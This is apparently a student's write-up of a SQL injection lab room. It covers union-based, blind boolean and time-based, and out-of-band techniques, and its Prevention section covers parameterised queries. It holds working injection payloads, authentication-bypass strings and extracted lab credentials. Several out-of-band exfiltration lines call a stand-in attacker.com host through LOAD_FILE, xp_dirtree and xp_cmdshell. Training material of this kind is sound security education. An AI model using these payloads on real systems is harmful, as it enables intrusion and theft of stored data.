# SQL Injection

## Overview

SQL Injection (SQLi) is one of the most impactful and enduring vulnerability classes in web application security. Classified under OWASP A05:2025 (Injection), it occurs when user-supplied input is incorporated directly into SQL queries without proper sanitisation or parameterisation — allowing an attacker to alter query logic, bypass authentication, exfiltrate data, or in some cases gain control of the underlying database server.

This room builds SQLi knowledge from the ground up: SQL features that make injection work, detection methodology, all four injection types (In-Band, Blind, and Out-of-Band), and prevention with parameterised queries.

**Skills introduced:** SQL comment and UNION syntax, information_schema enumeration, error-based and union-based extraction, authentication bypass, boolean-based and time-based blind injection, out-of-band exfiltration concepts, parameterised queries.

---

## Concepts Covered

### SQL Syntax Relevant to Injection

#### Comments
SQL comments cause the database to ignore everything following them on a line:
- `--` (double dash + space): MySQL/MSSQL single-line comment
- `#`: MySQL alternative
- `/* ... */`: Multi-line comment

**Why this matters:** When injecting into the middle of a query, leftover syntax after the payload would cause errors. A comment cleanly removes the remainder of the original query.

```sql
-- Original query
SELECT * FROM users WHERE username='INPUT' AND password='secret';

-- After injecting admin'--
SELECT * FROM users WHERE username='admin'-- AND password='secret';
-- Everything after -- is discarded; the password check never runs
```

#### UNION
The `UNION` operator combines results from two or more `SELECT` statements. Both statements must return the same number of columns with compatible data types.

```sql
SELECT name, age FROM students UNION SELECT username, id FROM admins;
```

**Attack use:** Append a second `SELECT` to a legitimate query to pull data from any accessible table. If the original query returns 3 columns, the injected UNION SELECT must return exactly 3 values.

#### LIKE and Wildcards
`LIKE` performs pattern matching: `%` matches any sequence, `_` matches exactly one character.

```sql
SELECT * FROM users WHERE username LIKE 'adm%';
-- Returns admin, administrator, etc.
```

**Attack use:** In Blind SQLi, `LIKE` is used to enumerate data one character at a time — test `LIKE 'a%'`, `LIKE 'b%'`, etc., until a true response confirms the character.

#### LIMIT
Controls how many rows are returned and which row to start from.

```sql
SELECT * FROM users LIMIT 1;      -- first row only
SELECT * FROM users LIMIT 2, 1;   -- skip 2 rows, return the 3rd
```

**Attack use:** Control which row is returned in injection payloads; prevent result flooding.

#### String Functions
- `group_concat()` — aggregates multiple rows into a single string. Invaluable when only one column output is available.
- `CONCAT()` — joins individual values.

```sql
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
-- Returns: admin:pass123<br>martin:secret<br>jim:work456
```

#### information_schema
Every MySQL, MariaDB, and PostgreSQL server has a built-in database called `information_schema` containing metadata about the entire server: database names, table names, and column names.

Key tables:
- `information_schema.tables`: `table_schema` (database name), `table_name`
- `information_schema.columns`: `table_name`, `column_name`

This is how an attacker goes from "I can inject" to "I know the entire database structure."

---

### SQL Injection — The Vulnerability

**Root cause:** The application builds a SQL query by concatenating user input directly into a string rather than using parameterised queries. The database cannot distinguish between the developer's intended SQL syntax and the attacker's injected SQL.

```php
// Vulnerable PHP
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";

// Injecting ?id=1 OR 1=1-- produces:
// SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
// OR 1=1 always evaluates true; -- removes the public check
```

**Three injection categories:**

| Category | How Results Are Received |
|----------|-------------------------|
| **In-Band** | Results visible directly in the HTTP response (Error-Based or Union-Based) |
| **Blind** | No direct output — infer from behaviour (Authentication Bypass, Boolean-Based, Time-Based) |
| **Out-of-Band** | Data exfiltrated through a separate network channel (DNS/HTTP to attacker-controlled server) |

---

### In-Band SQL Injection

**Error-Based:** Database error messages returned to the user reveal structure, table names, or data. A single quote `'` in a vulnerable parameter often produces a visible MySQL syntax error, revealing the query structure.

**Union-Based (the primary data extraction method):**

| Step | Goal | Example Payload |
|------|------|----------------|
| 1 | Determine column count | `1 UNION SELECT 1`, `1 UNION SELECT 1,2`, `1 UNION SELECT 1,2,3` (stop when no error) |
| 2 | Find visible columns | `0 UNION SELECT 1,2,3` — note which numbers appear on page |
| 3 | Extract database name | `0 UNION SELECT 1,2,database()` |
| 4 | List tables | `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='db_name'` |
| 5 | List columns | `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='target_table'` |
| 6 | Extract data | `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table` |

**Why use `0` or `-1` as the ID?** The original query must return zero rows so only the injected UNION result renders on the page. A valid ID fills the output with the legitimate record, obscuring the injected data.

---

### Blind SQL Injection

#### Authentication Bypass

The login query checks whether credentials match a row. With no output visible — only success or failure — the goal is to make the WHERE clause evaluate true for any row.

```sql
-- Original
SELECT * FROM users WHERE username='INPUT' AND password='INPUT' LIMIT 1;

-- Inject: username = ' OR 1=1;--  password = anything
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
-- OR 1=1 always true; -- removes password check; returns all rows; app sees rows = success
```

To target a specific account: inject `admin'--` as username — the query returns only the admin row with no password check.

**Common variations:**
- `' OR 1=1;--` — single quote wrap
- `' OR 1=1#` — MySQL hash comment
- `" OR 1=1--` — double quote wrap
- Try both username and password fields

#### Boolean-Based Blind SQLi

The application returns a binary signal (true/false page content, different JSON) with no direct data. Character-by-character enumeration using `LIKE`:

```sql
-- Confirm injection
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
-- True response confirms injection

-- Enumerate database name
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--  -- false
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--  -- true → first char is 's'
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';-- -- true → second char is 'q'
-- Continue until full name is known
```

The same technique applies to table names (via `information_schema.tables`) and column names (via `information_schema.columns`), then to actual data values.

#### Time-Based Blind SQLi

The page looks identical regardless of the condition. Use `SLEEP()` — a delay confirms a true condition; an immediate response is false.

```sql
-- Find column count
admin123' UNION SELECT SLEEP(5);--     -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--   -- 5-second delay → 2 columns confirmed

-- Enumerate (same character-by-character process, watching the clock)
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
-- 5-second delay → first character is 's'
```

**Practical caution:** Network latency can mimic SLEEP delays. Use 5–10 second intervals, test each character multiple times on noisy connections. On MSSQL, the equivalent is `WAITFOR DELAY '0:0:5'`.

| Scenario | Technique |
|----------|----------|
| Different page content for true/false | Boolean-Based |
| Identical response regardless of condition | Time-Based |
| No blind technique viable; DB has outbound network access | Out-of-Band |

---

### Out-of-Band SQL Injection

OOB is the last resort when in-band and blind techniques have failed but the database server can make outbound network connections. Data is exfiltrated through a separate channel — DNS or HTTP — to an attacker-controlled server.

**MySQL DNS exfiltration (Windows + UNC paths):**
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
-- database() resolves to 'webapp_db'
-- Triggers DNS lookup for webapp_db.attacker.com → attacker's DNS server logs the name
```

**MSSQL techniques:**
```sql
-- xp_dirtree — triggers DNS lookup by traversing a UNC path
EXEC master..xp_dirtree '\\attacker.com\share';

-- xp_cmdshell — runs OS commands (requires enabling; off by default in modern MSSQL)
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

**Receiving data:** Burp Collaborator, Interactsh (free, self-hostable), or a custom Python DNS/HTTP listener.

**Limitations:** Requires outbound DB server network access; DNS labels limited to 63 characters; engine-specific payloads.

---

### Prevention

**Parameterised Queries (Prepared Statements) — the definitive fix:**

```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";

// Fixed (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);

// Even ' OR 1=1-- is treated as a literal string — cannot modify query structure
```

```python
# Vulnerable
query = f"SELECT * FROM users WHERE username='{username}'"

# Fixed
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Input Validation:** Allowlisting expected formats (numeric IDs, specific character sets) before reaching the database. Never rely on blocklisting alone — attackers bypass filter lists with encoding and alternative syntax.

**Escaping:** Transforming special characters (e.g., `'` → `\'`) as a last resort for legacy codebases. Fragile and database-specific.

**Principle of Least Privilege:** The database account the web app uses should have only the permissions it needs. A read-only app should use a `SELECT`-only account. Never connect as root or sa from an application.

**WAF:** Inspect and block known SQLi patterns. Not a substitute for secure code — experienced attackers bypass WAFs with encoding, case variation, and alternative syntax.

---

## Methodology

```
1. Identify all injection points:
   URL parameters, form fields, cookies, HTTP headers,
   JSON/XML bodies, API parameters

2. Test for injection (detection):
   Inject ' and observe:
     - Database error → vulnerable (error-based confirmed)
     - Behavioural change → possibly vulnerable (boolean/time test needed)
     - No change → potentially sanitised, try other characters

3. Determine injection type:
   - Error visible in response → Error-Based In-Band
   - Can use UNION → Union-Based In-Band
   - True/false page difference → Boolean-Based Blind
   - No visible difference → Time-Based Blind (SLEEP)
   - Nothing else works but DB has outbound access → Out-of-Band

4. Union-Based enumeration workflow:
   Column count → visible columns → database() → tables → columns → data

5. Blind enumeration:
   Confirm injection → enumerate DB name char-by-char → tables → columns → data
   (Boolean: read response; Time: watch the clock)

6. Document findings for report:
   Proof of vulnerability, data extracted (redacted), CVSS rating, remediation
```

---

## Practical Activities

### Level 1 — Union-Based SQLi

**Objective:** Extract credentials from the `staff_users` table via Union-Based injection on the `id` parameter.

**Commands and payloads:**
```
# Step 1: Find column count
1 UNION SELECT 1        → error
1 UNION SELECT 1,2      → error
1 UNION SELECT 1,2,3    → success → 3 columns

# Step 2: Make UNION output visible (zero out original)
0 UNION SELECT 1,2,3    → 3 appears in content area → column 3 is extractable

# Step 3: Get database name
0 UNION SELECT 1,2,database()
→ sqli_one

# Step 4: List tables
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables WHERE table_schema='sqli_one'
→ article, staff_users

# Step 5: List columns
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns WHERE table_name='staff_users'
→ id, username, password

# Step 6: Extract data
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users
→ admin:pass123<br>martin:secret<br>jim:work456
```

**Why each step matters:** The column count must be exact — UNION is a SQL rule. Using `0` as the ID forces only the injected result to render. `information_schema` is the database's own index, making it the universal starting point for enumeration. `group_concat()` collapses multi-row results into a single extractable value.

---

### Level 2 — Authentication Bypass

**Objective:** Bypass a login form without knowing any valid credentials.

**Payload:** Username: `' OR 1=1;--` / Password: `anything`

**Resulting query:**
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

**Breakdown:**
- `username=''` — no match
- `OR 1=1` — always true; entire WHERE clause is now true
- `;--` — ends statement; comments out password check
- Database returns all rows; app logs you in as the first user

**Targeting a specific user:** `admin'--` as username produces:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```
Password check completely removed.

---

### Level 3 — Boolean-Based Blind SQLi

**Objective:** Extract admin credentials from an API returning only `{"taken":true/false}`.

**Process:**
```sql
-- Confirm injection (% wildcard always true)
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
→ {"taken":true}

-- Enumerate database name
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--   → true  → 's'
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';--  → true  → 'q'
-- Continue... → sqli_three

-- Enumerate table name
admin123' UNION SELECT 1,2,3 FROM information_schema.tables
WHERE table_schema='sqli_three' AND table_name LIKE 'u%';--
→ true → users

-- Extract username
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--  → true
-- Continue... → admin

-- Extract password
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3%';--
-- Continue... → 3845
```

**Finding:** Username `admin`, password `3845`.

---

### Level 4 — Time-Based Blind SQLi (Referrer Header)

**Objective:** Extract credentials when the response looks completely identical; injection point is the HTTP Referrer header.

**Process:**
```sql
-- Find column count (watch for delay, not page content)
admin123' UNION SELECT SLEEP(5);--     → immediate → wrong count
admin123' UNION SELECT SLEEP(5),2;--   → 5s delay → 2 columns

-- Enumerate database name
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--  → delay → 's'
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sq%';-- → delay → 'q'
-- Continue... → sqli_four

-- Enumerate admin password
admin123' UNION SELECT SLEEP(3),2 FROM users WHERE username='admin' AND password LIKE '4%';--
-- Continue... → 4961
```

**Finding:** Username `admin`, password `4961`.

**Key observation:** Every character required multiple requests; each true condition meant sitting through the sleep timer. This is the core trade-off of time-based blind SQLi — reliable but slow. In a real engagement, SQLMap would automate this enumeration. Doing it manually once reveals exactly why the technique works and where it breaks down.

---

## Observations and Analysis

- The `id` parameter in the Level 1 blog application accepted integer input but had no type validation and no parameterisation — a direct concatenation vulnerability. The SQL Query box confirmed this in real time.
- In Level 2, the application only checked whether any rows were returned — the actual query output was never displayed. This is what makes authentication bypass possible without needing to know any credentials.
- In Level 3, the `{"taken":true/false}` JSON response is a binary signal that can drive character-by-character enumeration just as effectively as visible page content. Any discernible behavioural difference is exploitable.
- In Level 4, the injection was in the `Referrer` HTTP header — not a URL parameter or form field. This reinforces that any value incorporated into a SQL query is an injection point, including request headers, cookies, and User-Agent strings.
- The complete absence of visible output in Level 4 (identical responses regardless of condition) is what forces the switch from boolean-based to time-based methodology.

---

## Tools and Technologies Used

### MySQL / MariaDB
- **Purpose:** Target database engine used throughout the room
- **Relevant functions:** `database()`, `group_concat()`, `SLEEP()`, `CONCAT()`
- **System tables:** `information_schema.tables`, `information_schema.columns`

### Browser / Application URL Bar
- **Purpose:** Primary injection delivery mechanism for URL parameter-based injection
- **How used:** Modified the `id` parameter directly in the mock browser address bar

### SQLMap (referenced in room, used in Room 6)
- **Purpose:** Automated SQLi detection and exploitation
- **Common usage:** `sqlmap -r request.txt -p search --dbs`
- **In this room:** Manual enumeration was performed to demonstrate the underlying logic; SQLMap automates the same character-by-character process

---

## Key Learnings

- SQL comments (`--`, `#`) are essential for cutting off the original query after an injection payload
- The UNION rule is absolute: both SELECT statements must return the same number of columns
- `information_schema` is the universal starting point for database structure enumeration — it exists on every MySQL/MariaDB/PostgreSQL server
- Using `0` or `-1` as the injected ID forces the original query to return empty, making UNION output the only thing rendered on the page
- Authentication bypass does not require knowing a password — it only requires making the WHERE clause evaluate true
- Boolean-based and time-based blind SQLi can extract entire databases without a single byte of data appearing in the HTTP response
- Time-based injection is the last resort when no other feedback channel exists — the delay is the answer
- Parameterised queries (prepared statements) are the only proper fix — they make SQL code and data physically separate at the database driver level

---

## Real-World Relevance

- **Penetration testing:** SQLi is one of the first checks on every web application assessment. Testing all user-controlled parameters against the database is standard practice.
- **Bug bounty:** IDOR and SQLi together represent the highest-frequency high-severity findings in bug bounty programmes. Union-based injection against a production database is an immediate critical severity.
- **Enterprise environments:** SQLi is often found in legacy internal applications built before secure coding practices were standard.
- **Red team operations:** Authentication bypass via SQLi provides initial access; subsequent enumeration of credential tables enables lateral movement.
- **Detection:** Parameterised queries eliminate the root cause. WAF rules (blocking `UNION SELECT`, `information_schema`, `SLEEP(`) provide a detection layer but are not a preventive substitute.

---

## Things Worth Remembering

- `'` (single quote) is the primary injection detection character — observe whether the response changes or errors
- Column count discovery: keep adding values to `UNION SELECT` until the error disappears
- Use `0` or `-1` as the ID to suppress the original row and show only UNION output
- `group_concat()` collapses multiple rows into one — essential when only one extraction column is available
- `information_schema.tables WHERE table_schema='db'` → table names; `information_schema.columns WHERE table_name='table'` → column names
- Authentication bypass pattern: `' OR 1=1;--` in username field, anything in password
- Boolean-based: watch the page response (true/false content difference)
- Time-based: watch the clock (`SLEEP(5)` → delay = true, immediate = false)
- OOB: database makes outbound request; data arrives at attacker's DNS/HTTP listener
- The fix: parameterised queries — pass user input as parameters, never concatenate into the query string

---

## Conclusion

This room delivered a complete foundation in SQL Injection — from the SQL syntax that makes payloads work through all major injection types and their practical exploitation methodology. The four lab levels demonstrated that each injection type requires a different approach: union-based extraction relies on understanding UNION semantics and information_schema; authentication bypass exploits the gap between query logic and access control; boolean-based blind requires patience and methodical character enumeration; time-based blind demands trusting the clock when all other output channels are closed. Understanding the manual process behind each technique is what allows a tester to adapt when automated tools are blocked, rate-limited, or producing false results.
